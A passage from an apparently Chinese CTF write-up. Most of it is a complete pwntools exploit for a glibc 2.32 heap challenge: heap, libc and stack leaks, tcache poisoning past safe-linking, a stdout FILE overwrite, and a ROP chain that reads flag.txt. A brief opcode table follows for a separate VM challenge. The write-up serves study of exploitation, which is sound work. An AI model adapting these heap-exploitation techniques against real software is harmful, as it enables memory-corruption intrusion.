</div><p>全场唯一解（2.32）已公布，大体思路一致，但暂时还没明白为什么他需要爆破，没有新版本环境。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">sz</span><span class="p">,</span><span class="n">data</span><span class="p">,</span> <span class="n">ignore</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.:&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size of your trash:&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="k">if</span><span class="p">(</span><span class="n">ignore</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your trash:&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">resize</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">sz</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.:&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size of new trashcan:&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Trashcan no.:&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">mask</span><span class="p">(</span><span class="n">heap_base</span><span class="p">,</span><span class="n">target</span><span class="p">):</span>
 <span class="k">return</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">&gt;&gt;</span> <span class="mh">0xc</span> <span class="p">)</span> <span class="o">^</span> <span class="n">target</span>

<span class="c1">#p = process(&#34;./a.out&#34;)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.71.103.59&#34;</span><span class="p">,</span><span class="mi">49153</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;31337&#34;</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

    <span class="n">heap_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">18</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">-</span> <span class="mh">0x11eb0</span>
    <span class="n">chunk_to_overlap</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x128c0</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11f38</span>
    <span class="n">bk</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11f40</span>
    <span class="n">chunk</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11ee0</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span>
    <span class="n">mask_ptr1</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11f20</span>
    <span class="n">mask_ptr2</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11fa0</span>
    <span class="n">ropchain</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11fd0</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x11fa0</span>

    <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;got heap leak&#34;</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1f8</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x1f8</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">create</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x108</span><span class="p">)</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x108</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">create</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>

    <span class="c1"># prepare fake pointers to create chunk overlapping</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xe1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x68</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x208</span><span class="p">)</span>

    <span class="c1"># trigger unlink</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x208</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x108</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="mh">0x2b0</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xb0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401</span><span class="p">))</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x108</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">resize</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x300</span><span class="p">)</span>

    <span class="n">show</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1e3cd0</span>
    <span class="n">stdout</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e46c0</span>
    <span class="n">stdin</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e39a0</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e7600</span>
    <span class="n">smallbin_data</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e3c20</span>
    <span class="n">pop_rax_rdx_rbx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1597d5</span>
    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2858f</span>
    <span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2ac3f</span>
    <span class="n">pop_rbp</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x266e0</span>
    <span class="n">leave_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x5591c</span>
    <span class="n">syscall_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x611ea</span>

    <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;got libc leak&#34;</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x2c1</span><span class="p">))</span>

    <span class="c1"># do tcache poisioning to get an arb write on stdout</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="s2">&#34;XXXX&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span><span class="mh">0x200</span><span class="p">)</span>
    <span class="n">resize</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span><span class="mh">0x200</span><span class="p">)</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="mh">0x300</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="mh">0x2b0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mask</span><span class="p">(</span><span class="n">mask_ptr1</span><span class="p">,</span><span class="n">stdout</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x68</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">smallbin_data</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400</span><span class="p">))</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">23</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="o">+</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdin</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">][:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
    <span class="n">saved_rip</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x140</span> <span class="o">-</span> <span class="mh">0x8</span>

    <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;got stack leak&#34;</span><span class="p">)</span>
    <span class="c1"># do tcache poisioning on a functions saved rip</span>

    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;got all leaks&#34;</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap base: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc base: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;stack leak: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)))</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;XXXX&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;AAAA&#34;</span><span class="p">)</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mh">0x200</span><span class="p">)</span>
    <span class="n">resize</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="mh">0x200</span><span class="p">)</span>

    <span class="n">resize</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="mh">0x300</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="mh">0x2b0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x70</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mask</span><span class="p">(</span><span class="n">mask_ptr2</span><span class="p">,</span><span class="n">saved_rip</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_rdx_rbx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_rdx_rbx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_rdx_rbx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">))</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">26</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;flag.txt</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">27</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;AAAAAAAA&#34;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ropchain</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">))</span>

    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;got flag: &#34;</span> <span class="o">+</span> <span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span><span class="p">:</span>
    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;exploit failed&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="interpreter">Interpreter</h2>
<p>C++实现的vmpwn，逆指令就完事了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">op reg1 [reg2] [reg3]

opcode  operations

c       ip+=2, 
r       ip+=3, byte v13[reg1] = byte v14[ short v13[reg2] ] 
w       ip+=3, byte v14[ short v13[reg1] ] =  byte v13[reg2]  
a       ip+=4, byte v13[reg1] = byte v13[reg2] + byte v13[reg3]
d       ip+=4, byte v13[reg1] = short v13[reg2] / short v13[reg3]
m       ip+=4, byte v13[reg1] = byte v13[reg2] * byte v13[reg3]
s       ip+=4, byte v13[reg1] = byte v13[reg2] - byte v13[reg3]

</code></pre></td></tr></table>
</div>
